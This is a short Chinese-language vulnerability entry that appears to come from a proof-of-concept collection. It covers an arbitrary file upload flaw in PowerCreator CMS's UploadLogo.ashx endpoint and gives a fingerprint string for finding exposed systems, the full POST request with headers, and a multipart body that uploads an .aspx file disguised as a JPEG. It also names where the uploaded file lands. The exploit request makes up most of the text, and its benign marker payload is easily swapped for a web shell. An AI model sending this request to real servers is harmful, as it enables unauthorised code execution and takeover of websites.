# PowerCreatorCMSUploadLogo存在任意文件上传漏洞

- **系统**：PowerCreatorCMSUploadLogo　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`"PowerCreator-CMS"`
- **请求**：`POST /upload/UploadLogo.ashx?fileName=1.aspx HTTP/1.1`
- **关键头**：`Content-Length: 245`　`Content-Disposition: form-data;name="file1";filename="poc.aspx";`　`Content-Type: multipart/form-data; boundary=---------------------------208…`

**请求体 / payload**
```
-----------------------------20873900192357278038549710136
Content-Disposition: form-data; name="file"; filename="poc.aspx"
Content-Type: image/jpeg
2etjJQglyub8ePXc0iTQlzBZk8t
-----------------------------20873900192357278038549710136--

上传文件位置
/images/logo/1.aspx
```

**其他**
- PowerCreator CMS UploadLogo存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * PowerCreator CMS